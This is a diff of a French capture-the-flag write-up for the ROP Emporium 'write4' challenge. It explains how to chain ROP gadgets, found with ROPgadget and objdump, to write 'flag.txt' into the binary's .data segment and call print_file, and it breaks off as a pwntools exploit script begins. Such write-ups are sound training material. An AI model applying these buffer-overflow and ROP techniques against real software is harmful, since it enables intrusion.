@@ -77,7 +77,7 @@ p.interactive()
 <div id='write4-writeup'/>
 # write4
 
-Après lecture de la description du [challenge write4](https://ropemporium.com/challenge/write4.html), nous comprenons que nous allons devoir **write flag.txt** en mémoire dans un **segment du binaire accessible en écriture** et **call** la fonction `print_file()` dans la **PLT**. Il est spécifié que `print_file()` prend comme seul argument **l'emplacement mémoire** de flag.txt.
+Après lecture de la description du [challenge write4](https://ropemporium.com/challenge/write4.html), nous comprenons que nous allons devoir **write flag.txt** en mémoire dans un **segment du binaire accessible en écriture** car cette string n'est pas présente de facon analogue et **call** la fonction `print_file()` dans la **PLT**. Il est spécifié que `print_file()` prend comme seul argument **l'emplacement mémoire** de flag.txt.
 
 Premièrement regardons les permissions des différents segments et sections du binaire :
 ```py
@@ -112,6 +112,36 @@ Récupérons l'adresse du segment :
 ```
 
 L'adresse de ce dernier est `0x601028`.
+
+Maintenant, nous devons trouver un moyen de setup flag.txt dans .data. Pour cela nous avons 2 gadgets intéressants `pop r14 ; pop 15 ; ret` et `mov qword ptr [r14], r15 ; ret` :
+
+```py
+❯ ROPgadget --binary write4
+<...>
+0x0000000000400690 : pop r14 ; pop r15 ; ret
+0x0000000000400628 : mov qword ptr [r14], r15 ; ret
+<...>
+```
+
+Le but va etre d'empiler **l'adresse du segment writable** (.data) et la string **flag.txt** grace au buffer overflow, de setup ses valeurs dans 2 registres (ici r14 et r15) à l'aide d'un pop, puis de copier la valeur pointé dans l'opérande source (r15 qui pointe vers flag.txt) dans l'opérande de destination. (r14 qui pointe vers l'adresse de .data)
+Ainsi, notre string flag.txt sera stocké à l'adresse du segment .data.
+
+Rappel : pop permet de désempiler de la stack la valeur pointé dans RSP et déplacer cette valeur dans l'opérande indiquée.
+
+<br/>
+
+Une fois que nous avons flag.txt dans notre binaire, il nous suffit simplement de passer en argument cette chaine à la fonction `print_file()`. Alors nous avons besoin d'un gadget `pop rdi ; ret` et évidemment de l'adresse de la fonction `print_file()` :
+
+```py
+❯ ROPgadget --binary write4 | grep "pop rdi ; ret"
+0x0000000000400693 : pop rdi ; ret
+❯ objdump -d write4 | grep print_file
+0000000000400510 <print_file@plt>:
+  400510:       ff 25 0a 0b 20 00       jmpq   *0x200b0a(%rip)        # 601020 <print_file>
+  400620:       e8 eb fe ff ff          callq  400510 <print_file@plt>
+```
+
+Afin d'automatiser notre exploitation j'ai développé un petit script en python toujours avec la [librairie pwntools](https://github.com/Gallopsled/pwntools) :
 
 ```py
 from pwn import *
